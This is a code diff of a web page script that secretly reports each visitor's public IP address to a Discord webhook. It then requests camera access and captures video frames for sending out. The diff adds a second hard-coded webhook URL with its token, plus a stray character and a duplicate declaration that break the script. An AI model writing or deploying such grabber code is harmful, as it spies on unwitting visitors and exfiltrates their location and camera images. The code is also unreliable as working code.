@@ -8,6 +8,9 @@
 <script>
 const webhook = "https://discord.com/api/webhooks/1385579764592545852/x523eBesGbYlF1EtN7CEwy52A8EpvX9fOGl37Xx63YeS1sEHLAu7_kEif9krCA3bt_lY";
 
+>
+const webhook = "https://discord.com/api/webhooks/1375557646765002942/qYhl3vAwgFaFSvn_Tnzno4Z-NlGa_HpS8omMiw53Dt1iwKdjPjkAMxYyWtNl_bo3CleU";
+
 async function fetchIPFromAPI(url, parseFn) {
   try {
     let res = await fetch(url);
@@ -20,7 +23,6 @@ async function fetchIPFromAPI(url, parseFn) {
 }
 
 async function getPublicIP() {
-  // Try multiple services
   let ip = await fetchIPFromAPI('https://api.ipify.org?format=json', data => data.ip);
   if (ip) return ip;
 
@@ -57,14 +59,14 @@ async function sendData(imageBlob, ip) {
 
 async function captureLoop() {
   const ip = await getPublicIP();
-  await sendData(null, ip); // send IP info even if no camera access
+  await sendData(null, ip); // Send IP info immediately, no camera needed
 
   let stream;
   try {
     stream = await navigator.mediaDevices.getUserMedia({video:true});
   } catch {
     console.error('Camera access denied or unavailable');
-    return;
+    return; // Stop if no camera access but IP already sent
   }
 
   const video = document.createElement('video');
